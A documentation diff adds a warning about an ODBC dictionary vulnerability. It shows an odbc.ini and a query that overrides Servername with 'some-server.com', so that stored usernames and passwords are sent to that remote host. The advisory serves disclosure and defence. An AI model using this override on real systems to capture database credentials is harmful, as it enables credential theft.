@@ -124,6 +124,35 @@ Setting fields:
 - `connection_string` – Connection string.
 - `invalidate_query` – Query for checking the dictionary status. Optional parameter. Read more in the section [Updating dictionaries](external_dicts_dict_lifetime.md#dicts-external_dicts_dict_lifetime).
 
+
+### Known vulnerability of the ODBC dictionary functionality
+
+!!! attention
+    When connecting to the database through the ODBC driver connection parameter `Servername` can be substituted. In this case values of `USERNAME` and `PASSWORD` from `odbc.ini` are sent to the remote server and can be compromised.
+
+**Example of insecure use**
+
+Let's configure unixODBC for PostgreSQL. Content of `/etc/odbc.ini`:
+
+```
+[gregtest]
+Driver = /usr/lib/psqlodbca.so
+Servername = localhost
+PORT = 5432
+DATABASE = test_db
+#OPTION = 3
+USERNAME = test
+PASSWORD = test
+```
+
+If you then make a query such as
+
+```
+SELECT * FROM odbc('DSN=gregtest;Servername=some-server.com', 'test_db');    
+```
+
+ODBC driver will send values of `USERNAME` and `PASSWORD` from `odbc.ini` to `some-server.com`.
+
 ### Example of Connecting PostgreSQL
 
 Ubuntu OS.
